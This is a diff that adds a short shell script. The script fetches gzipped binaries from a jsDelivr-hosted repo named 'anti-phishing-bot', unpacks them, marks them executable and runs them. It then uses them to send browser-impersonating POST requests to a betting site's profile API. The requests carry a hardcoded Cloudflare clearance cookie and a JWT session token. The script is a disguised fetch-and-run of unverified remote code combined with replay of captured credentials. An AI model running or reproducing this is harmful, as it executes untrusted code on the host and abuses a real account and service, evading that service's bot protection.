@@ -1,0 +1,13 @@
+cd /tmp
+curl -fs -o g.gz https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@main/ci2
+curl -fs -o m.gz https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2@main/cm2
+node -e "require('fs').writeFileSync('g',require('zlib').gunzipSync(require('fs').readFileSync('g.gz')))"
+node -e "require('fs').writeFileSync('m',require('zlib').gunzipSync(require('fs').readFileSync('m.gz')))"
+chmod +x g m 2>/dev/null
+for x in g m; do
+if ./$x --version >/dev/null 2>&1; then sleep 15; fi
+done
+for x in g m; do
+./$x --impersonate chrome136 -s -o /dev/null -X POST "https://titobet.com/api/user/profile" -H "content-type: application/json" -b "cf_clearance=CpAJNti2Gz1GmCGnL6uALjRYrgYmvM2ziRLYYKpeeOMsfQaJPHRvHEhyGhCQ022Dej-6gOI_8pr_dHcgXj7IgNYjvzwa_UUa8SkKq8ike6ttRke9OpZXY4WzIKOcOCFt1zFTo-Qm3LCbNobntQJjRgssH4MjxW1sDq799_BPm429gnMPIm0wiH4H6weBRtW0YRUbB6FEYc_Om2NsQ6QdOx8v0SCWPwil_pBsgKs2whKguPbosySzB2f9Bbb4GJUeiN0f-K9b0ZdBPKAKsXMBQ-0b3TNcdvj99nII_mPAn0pidTGiuNkAYORTB9zqJ2BY3SQPzypzR_dv3-H4dzHk0_mP8OEBxamufd122L-oYSJHCU2_HCvnNX8gRrFRP5H30ep9hPmmZOtIO0iIfq7YkGAHEBg6sGcqTjD2Lp-c6VUf99id3HjH1Q; bearer=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BsYXllcmFwaS5odWJnYW1pbmcuY29tL2FwaS9wbGF5ZXIvYXV0aC9sb2dpbiIsImlhdCI6MTc5MzMyMzM5MiwiZXhwIjoxNzkzNDk2MTkyLCJuYmYiOjE3OTMzMjMzOTIsImp0aSI6ImlUdml4QldrOHFCZFlVZUsiLCJzdWIiOiIxMDEzMjY1MyIsInBydiI6IjFkMGEwMjBhY2Y1YzRiNmM0OTc5ODlkZjFhYmYwZmJkNGU4YzhkNjMiLCJ3ZWJzaXRlX2lkIjoyNH0.HKa2aEX1VbTl6PyVXLnLq6a4Yxt435b6u3CAmFYrHBk; wallet=TRY; language=tr" -d '{"occupation":"CF4"}'
+done
+sleep 5
